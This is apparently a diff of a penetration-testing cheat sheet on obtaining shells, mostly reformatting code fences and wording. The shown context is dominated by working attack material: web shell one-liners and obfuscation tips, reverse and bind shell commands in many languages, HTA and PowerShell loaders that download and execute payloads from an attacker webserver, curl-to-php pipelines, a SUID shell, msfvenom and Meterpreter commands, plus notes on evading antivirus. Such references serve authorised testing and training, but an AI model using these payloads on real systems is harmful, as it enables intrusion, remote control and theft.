@@ -15,7 +15,7 @@ do not natively implement those features (such as `netcat` for example) and
 for which use of the arrows keyboard keys result in `^[[C` / `^[[D` / `^[[A` /
 `^[[B`.
 
-```
+```bash
 rlwrap <COMMAND> [<ARGUMENTS>]
 ```
 
@@ -37,13 +37,13 @@ tcpdump -i <INTERFACE> icmp
 On target, make ICMP `echo` requests using ping in **background** to prevent
 shell lose in case of blocked ping:
 
-```
+```bash
 ping -c 2 <IP> &
 
 python -c 'import os;  os.popen("ping -c 2 <IP> &");"
 python -c 'import os;  os.popen("ping -n 2 <IP> &");"
 
-# Python in a pyjail  
+# Python in a pyjail
 [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('ping -c 2 <IP>').read()
 [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('ping -n 2 <IP>').read()
 ```
@@ -63,7 +63,7 @@ Otherwise and by default, the `public profile` is applied.
 Windows blocks inbound connections and allows outbound connections for all
 profiles by default.
 
-```
+```bash
 # Show the profile applied to each network adapter
 netsh advfirewall monitor show currentprofile
 
@@ -82,18 +82,12 @@ A web shell is a script written in the supported language of the targeted web
 server to be uploaded and executed by the web service. It provides a mean to
 execute system commands on the target.
 
-A collection of web shells for various languages is accessible on `GitHub`:
+A collection of web shells for various languages
+[is accessible on `GitHub`](https://github.com/xl7dev/WebShell).
 
-```
-https://github.com/xl7dev/WebShell
+`Kali Linux` also comes with a *smaller* collection of web shell, located in:
 
-# Backup fork
-https://github.com/Qazeer/WebShell
-```
-
-Kali Linux also comes with a *smaller* collection of web shell, located in:
-
-```
+```bash
 /usr/share/webshells
 ```
 
@@ -104,7 +98,7 @@ Kali Linux also comes with a *smaller* collection of web shell, located in:
 `JSP` one-liner without output to execute system commands through GET
 parameters:
 
-```
+```bash
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
@@ -116,13 +110,13 @@ file upload capability while being as small and widely compatible as possible.
 Once uploaded on the target system, load the following `JavaScript` code
 using the browser console to activate the user interface:
 
-```
+```bash
 javascript:{window.localStorage.embed=window.atob("ZG9jdW1lbnQud3JpdGUoIjxwPiIpOw0KdmFyIGh0bWwgPSAiPGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSdjbWQuanNwJz5cDQo8aW5wdXQgbmFtZT0nYycgdHlwZT10ZXh0PjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz5cDQo8L2Zvcm0+PGhyPlwNCjxmb3JtIGFjdGlvbj0nY21kLmpzcCcgbWV0aG9kPXBvc3Q+XA0KVXBsb2FkIGRpcjogPGlucHV0IG5hbWU9J2EnIHR5cGU9dGV4dCB2YWx1ZT0nLic+PGJyPlwNClNlbGVjdCBhIGZpbGUgdG8gdXBsb2FkOiA8aW5wdXQgbmFtZT0nbicgdHlwZT0nZmlsZScgaWQ9J2YnPlwNCjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2InIGlkPSdiJz5cDQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz5cDQo8L2Zvcm0+PGhyPiI7DQp2YXIgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQpkaXYuaW5uZXJIVE1MID0gaHRtbDsNCmRvY3VtZW50LmJvZHkuaW5zZXJ0QmVmb3JlKGRpdiwgZG9jdW1lbnQuYm9keS5maXJzdENoaWxkKTsNCg0KdmFyIGhhbmRsZUZpbGVTZWxlY3QgPSBmdW5jdGlvbihldnQpIHsNCiAgICB2YXIgZmlsZXMgPSBldnQudGFyZ2V0LmZpbGVzOw0KICAgIHZhciBmaWxlID0gZmlsZXNbMF07DQoNCiAgICBpZiAoZmlsZXMgJiYgZmlsZSkgew0KICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCg0KICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24ocmVhZGVyRXZ0KSB7DQogICAgICAgICAgICB2YXIgYmluYXJ5U3RyaW5nID0gcmVhZGVyRXZ0LnRhcmdldC5yZXN1bHQ7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYicpLnZhbHVlID0gYnRvYShiaW5hcnlTdHJpbmcpOw0KICAgICAgICB9Ow0KDQogICAgICAgIHJlYWRlci5yZWFkQXNCaW5hcnlTdHJpbmcoZmlsZSk7DQogICAgfQ0KfTsNCmlmICh3aW5kb3cuRmlsZSAmJiB3aW5kb3cuRmlsZVJlYWRlciAmJiB3aW5kb3cuRmlsZUxpc3QgJiYgd2luZG93LkJsb2IpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGhhbmRsZUZpbGVTZWxlY3QsIGZhbHNlKTsNCn0gZWxzZSB7DQogICAgYWxlcnQoJ1RoZSBGaWxlIEFQSXMgYXJlIG5vdCBmdWxseSBzdXBwb3J0ZWQgaW4gdGhpcyBicm93c2VyLicpOw0KfQ==");eval(window.localStorage.embed);};void(0);
 ```
 
 #### PHP
 
-###### Basic  
+###### Basic
 
 Basic PHP code to execute system commands through GET parameters:
 
@@ -134,7 +128,7 @@ Basic PHP code to execute system commands through GET parameters:
 <?php if($_GET['cmd']) { preg_replace('/.*/e', $_GET['cmd'], ''); } ?>
 ```
 
-###### Stealthy  
+###### Stealthy
 
 Instead of passing the commands through the URL, which would appear in logs,
 heades parameters can be used:
@@ -144,7 +138,7 @@ $_SERVER['HTTP_ACCEPT_LANGUAGE']
 $_SERVER['HTTP_USER_AGENT']
 ```
 
-###### Obfuscation  
+###### Obfuscation
 
 The following functions can be used to obfuscate the code.
 
@@ -158,13 +152,13 @@ str_rot13()
 
 ###### phpbash
 
-phpbash is a simple standalone, semi-interactive web shell.  
+phpbash is a simple standalone, semi-interactive web shell.
 Upload the phpbash.php or phpbash.min.php file on the target and access it
 with any Javascript-enabled web browser to achieve RCE.
 
 https://github.com/Arrexel/phpbash
 
-###### Weevely  
+###### Weevely
 
 Weevely is a password protected web shell designed for post-exploitation
 purposes that can be extended over the network at runtime.
@@ -172,7 +166,7 @@ purposes that can be extended over the network at runtime.
 Upload weevely PHP agent to a target web server to get remote shell access to
 it. It has more than 30 modules to assist administrative tasks, maintain access,
 provide situational awareness, elevate privileges, and spread into the target
-network.  
+network.
 The agent is a small, polymorphic PHP script hardly detected by AV and the
 communication protocol is obfuscated within HTTP requests.
 
@@ -197,7 +191,7 @@ system commands on a web server supporting the CFM file format.
 
 To execute `CMD` command on `Windows`, the parameters are as follow:
 
-```
+```bash
 # Path to the cmd binary
 Command: c:\windows\system32\cmd.exe
 
@@ -209,7 +203,7 @@ Options: /c <COMMAND>
 
 ###### [Linux / Windows] Netcat
 
-```
+```bash
 # Linux
 # If nc's "-e" option is available on the targeted system:
 nc [-4] -lvnp <PORT> -e /bin/sh &
@@ -227,7 +221,7 @@ nc64.exe -lvnp <PORT> -e cmd.exe
 
 ###### [Linux / Windows] Basic listeners
 
-```
+```bash
 # TCP
 nc -lvnp <PORT>
 rlwrap nc -lvnp <PORT>
@@ -245,14 +239,14 @@ openssl s_server -quiet -key tmpkey.pem -cert tmpcert.pem -port <PORT>
 
 ###### [Windows] PowerCat
 
-```
+```bash
 powercat -l -p 443 -ep
 powercat -l -p 443 -e <BINARY>
 ```
 
 ###### [Linux / Windows] xct's xc
 
-```
+```bash
 xc -l -p <PORT>
 rlwrap xc -l -p <PORT>
 
@@ -261,7 +255,7 @@ xc.exe -l -p <PORT>
 
 ###### [Linux / Windows] Python ICMP
 
-```
+```bash
 python icmpsh_m.py <HOST_IP> <TARGET_IP>
 ```
 
@@ -284,7 +278,7 @@ sh -i >& /dev/udp/<IP>/<PORT> 0>&1
 
 ###### [Linux / Windows] Netcat
 
-```
+```bash
 # Linux
 # If nc's "-e" option is available on the targeted system:
 nc -e /bin/sh <IP> <PORT> &
@@ -306,7 +300,7 @@ version of `netcat`. It can for example have multiple clients listening on a
 same port or reuse a connection. It is rarely present by default in Linux
 distributions.
 
-```
+```bash
 socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
 socat tcp-connect:<IP>:<PORT> exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane
 socat tcp-connect:<IP>:<PORT> exec:"sh -li",pty,stderr,setsid,sigint,sane
@@ -321,7 +315,7 @@ Starting PowerShell with the straight reverse shell command,
 `powershell -c <COMMAND>`, may results in error. Encoding and executing the
 command in `base64` oftentimes proves to be more successful.
 
-```
+```bash
 # Conversion to base64 in PowerShell.
 # Can be executed on attacking system, to  encode in base64 the reverse shell script.
 $cmd = '$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
@@ -345,7 +339,7 @@ providing the same functionalities as `netcat`.
 DNS. It can be used to execute a local executable, such as `cmd`, `powershell`
 directly, or a custom payload.
 
-```
+```bash
 As with any PowerShell function, powercat has to be loaded in memory to be executed
 . .\powercat.ps1
 IEX (New-Object System.Net.Webclient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/powercat.ps1')
@@ -375,9 +369,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').popen('<REVERSE_SHELL>').read()
 ```
 
-###### PHP   
+###### PHP
 
-```php
+```bash
 # Linux
 # This code assumes that the TCP connection uses file descriptor 3.
 # If it doesn’t work, try 4, 5, 6…
@@ -404,13 +398,13 @@ ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <
 
 Requires a listener that supports `SSL` / `TLS` connections.
 
-```
+```bash
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s
 ```
 
 ###### Groovy
 
-```
+```bash
 # Source: https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy
 # BINARY: /bin/sh | /usr/bin/bash | cmd.exe | powershell.exe | ...
 String host="<IP | HOSTNAME>";
@@ -422,13 +416,17 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 #### Complete reverse shell scripts
 
 The scripts usually need to be uploaded on the target or hosted on a webserver,
-which can be done using python:
+which can be done (for example) using python:
 
 ```python
+# Python 3.X
+python -m http.server <PORT>
+
+# Python 2.X.
 python -m SimpleHTTPServer <PORT>
 ```
 
-###### PowerShell  
+###### PowerShell
 
 The [`Nishang PowerShell`](https://github.com/samratashok/nishang) scripts can
 be used to get a reverse shell.
@@ -469,32 +467,41 @@ curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php
 wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php
 
 # Through PHP code injection
-# The system call be replaced with various PHP functionalities detailed above.  
+# The system call be replaced with various PHP functionalities detailed above.
 system('curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
 system('wget -qO- http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php')
 ```
 
 ###### [Windows] HTML Application
 
-Windows HTML Application script can contain JavaScript or VBScript that will be
-interpreted by the operating system.
+Windows `HTML Application (HTA)` file are `HTML` based and may contain
+`JavaScript` or `VBScript` that will be interpreted by the Windows operating
+system. More precisely, the `HTA` script can be interpreted through
+`Internet Explorer` or the Windows engine `mshta.exe`. As the file is not
+written on disk but directly interpreted from the remote URL, this technique
+can be used to bypass some anti-virus solutions (statement that does not hold
+as true now).
 
-The HTA script can be interpreted through `Internet Explorer` or the Windows
-engine `mshta.exe`. As the file is not written on disk but directly
-interpreted from the remote URL, this technique can be used to bypass
-some anti-virus solutions.
-
-The following HTA script can be used to load in memory and execute the
-`Nishang` `PowerShell`'s `Invoke-PowerShellTcp` cmdlet:
+The following `HTA` script can be used to execute some PowerShell code (such
+as loading in memory and executing a PowerShell script). As the 32-bit version
+of `mshta.exe` seems to be executed by default, be aware that it will by
+default execute the 32-bit version of PowerShell. Even if the
+`C:\Windows\System32` path is specified, it will be mapped to
+`C:\Windows\SysWOW64` (for compatibility reasons). To force the 64-bit version
+of PowerShell to executed (needed for 64-bit shellcode for instance), the
+`C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe` path should be
+specified.
 
 ```
+# <COMMAND> example: powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>
+
 <script language="VBScript">
   window.moveTo -4000, -4000
   Set eWZ3pL4 = CreateObject("Wscript.Shell")
   Set gOhlGr = CreateObject("Scripting.FileSystemObject")
   For each path in Split(eWZ3pL4.ExpandEnvironmentStrings("%PSModulePath%"),";")
     If gOhlGr.FileExists(path + "\..\powershell.exe") Then
-      eWZ3pL4.Run "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>",0
+      eWZ3pL4.Run "<COMMAND>",0
       Exit For
     End If
   Next
@@ -510,7 +517,7 @@ the notable advantage of providing a failover mechanism: a live page related to
 Windows Defender from the Microsoft website is loaded if the HTA execution
 fails.
 
-```
+```bash
 # Import-Module .\Out-HTA.ps1
 # Get-Help -full Out-HTA
 
@@ -519,7 +526,6 @@ Out-HTA -PayloadURL '<http://<WEBSERVER_IP>:<WEBSERVER_PORT>/<PowerShell.ps1>'
 Out-HTA -PayloadScript '<POWERSHELL_FILEPATH>'
 ```
 
-
 #### Complete reverse shell binaries
 
 ###### [Linux] C binary for SUID shell
@@ -527,9 +533,9 @@ Out-HTA -PayloadScript '<POWERSHELL_FILEPATH>'
 The following code can be compiled to get a binary that will spawn a shell with
 out dropping the SID bit. Change the owner of the binary if needed
 `chown root.root suid` and then set the SUID bit and execution mode of the
-compiled binary using `chmod 4755 suid` or `chmod a=srx suid`.  
+compiled binary using `chmod 4755 suid` or `chmod a=srx suid`.
 
-```
+```c
 # gcc -m32 -Wl,--hash-style=both -o suid suid.c
 
 int main(void) {
@@ -558,7 +564,7 @@ use the same OS and kernel for Linux targets).
 
 To compile for a Windows target on Linux use the cross-compiler `mingw`:
 
-```
+```bash
 # 32 bits
 i686-w64-mingw32-gcc -o test.exe test.c
 
@@ -573,7 +579,7 @@ number of basic functionalities: file upload / download, local / remote ports
 forwarding, run as another user, client auto reconnect, etc. It can also be
 used on Windows systems to load and execute `.NET` assembly from memory.
 
-```
+```bash
 # A xct's xc listener must be listening.
 xc.exe <HOSTNAME | IP> <PORT>
 xc <HOSTNAME | IP> <PORT>
@@ -582,7 +588,7 @@ xc <HOSTNAME | IP> <PORT>
 Once a session has been established through `xc`, the following notable
 commands are supported:
 
-```
+```bash
 # Linux / Windows common commands.
 !upload <SOURCE_FILE> <DESTINATION_FILE> - uploads the specified file to the remote host.
 !download <SOURCE_FILE> <DESTINATION_FILE> - download the specified file from the remote host.
@@ -611,7 +617,7 @@ commands are supported:
 
 `msfvenom` can be used to generate a reverse shell binary:
 
-```
+```bash
 # 32 bits
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
 
@@ -632,7 +638,7 @@ The `char host[] = "<IP>";` and `int port = <PORT>;` instructions should be
 updated to match the contacted server. The reverse shell binary can be simply
 executed with out arguments or using `re.exe <IP> <PORT>`.
 
-```
+```bash
 # Compilation to a static standalone binary from a Linux operating system.
 i686-w64-mingw32-g++ re.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 ```
@@ -720,7 +726,7 @@ int main(int argc, char **argv) {
 
 Chashell is a cross-platform Go reverse shell that communicates over DNS. It
 can be used to bypass firewalls or tightly restricted networks. As `chashell`
-relies on DNS, a Domain Name is required and must be bought and configured.  
+relies on DNS, a Domain Name is required and must be bought and configured.
 
 `chashell` makes use of a (multi-client) control server, `chaserv`, to receive
 the reverse shell connections.
@@ -806,9 +812,9 @@ stty -rows <ROWS> -columns <COLUMNS>
 ### Meterpreter
 
 Meterpreter is an advanced, dynamically extensible payload that uses in-memory
-DLL injection stagers and is extended over the network at runtime.  
+DLL injection stagers and is extended over the network at runtime.
 It communicates over the stager socket and provides a comprehensive
-client-side Ruby API.   
+client-side Ruby API.
 It features command history, tab completion, channels, and more.
 
 ###### Handler
@@ -826,7 +832,7 @@ msf> use multi/handler
 msf> set payload <PAYLOAD>
 
 # Set the local IP and port. In case of a NATED VM with port
-# forwarding/redirection, the IP 0.0.0.0 can be used  
+# forwarding/redirection, the IP 0.0.0.0 can be used
 msf> set LHOST <HOSTIP>
 msf> set LPORT <HOSTPORT>
 
